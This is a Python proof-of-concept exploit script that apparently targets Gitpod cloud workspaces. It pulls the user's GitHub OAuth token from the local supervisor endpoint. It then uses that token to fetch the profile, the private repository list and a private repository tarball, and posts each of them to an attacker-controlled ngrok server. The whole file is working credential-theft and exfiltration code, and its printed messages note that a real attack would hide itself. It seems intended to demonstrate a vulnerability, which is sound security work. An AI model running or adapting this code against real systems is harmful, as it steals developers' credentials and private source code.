import requests
import sys
import os
import json


ATTACKER_SERVER = 'https://b9fd-75-174-250-116.ngrok-free.app'


print('\n[~] Hello from the oneclick pwn exploit PoC')
print('Normally this attack wouldn\'t announce itself, but since it is for demonstration please follow here\n')
print('=' * 60)

print('\n[~] asking supervisor for github oauth2 token')
r = requests.get('http://localhost:22999/_supervisor/v1/token/git/github.com/')
if r.status_code != 200:
  print('[-] phishing attempt failed: supervisor has no github token')
  sys.exit()

email = os.getenv('GITPOD_GIT_USER_EMAIL', 'UNK_USER')
tok = r.json()['token']
scopes = r.json()['scope']
print('[+] supervisor provided token {tok} with scopes {scopes}, sending to attacker')
requests.post(f'{ATTACKER_SERVER.rstrip("/")}/{email}_token_json', 
  data=json.dumps({"email": email, "token": tok, "scopes": scopes}, indent=2).encode())

if len([s for s in scopes if "user" in s]) == 0:
  print('[-] phishing attempt halted, can\'t continue to user exfiltration without user scope')
  sys.exit()

headers = {
  'Accept': 'application/vnd.github+json',
  'X-GitHub-Api-Version': '2022-11-28',
  'Authorization': f'Bearer {tok}'
}

print('[~] asking Github for user profile')
r = requests.get('https://api.github.com/user', headers=headers)
username = r.json()['login']
print(f'[+] able to retrieve user profile data for {username}, sending to attacker')
requests.post(f'{ATTACKER_SERVER.rstrip("/")}/{email}_poc_profile_json', data=json.dumps(r.json(), indent=2).encode())

if len([s for s in scopes if "repo" in s]) == 0:
  print('[-] phishing attempt halted with partial success, can\'t continue to repo exfiltration without repo scope')
  sys.exit()

print('[~] asking Github for user private repos')
r = requests.get('https://api.github.com/user/repos?type=private&per_page=1', headers=headers)
repo_url = r.json()[0]['url']
print(f'[+] able to retrieve private repo list, sending to attacker')
requests.post(f'{ATTACKER_SERVER.rstrip("/")}/{email}_poc_repo_list_json', data=json.dumps(r.json(), indent=2).encode())

print('[~] asking Github for private repo tarball')
r = requests.get(f'{repo_url}/tarball', headers=headers)
print(f'[+] able to download a private repo tarball, sending to attacker')
requests.post(f'{ATTACKER_SERVER.rstrip("/")}/{email}_poc_priv_repo_tar', data=r.content)

print(f'[+] PoC demonstrated all steps, in the real world it would now obscure itself')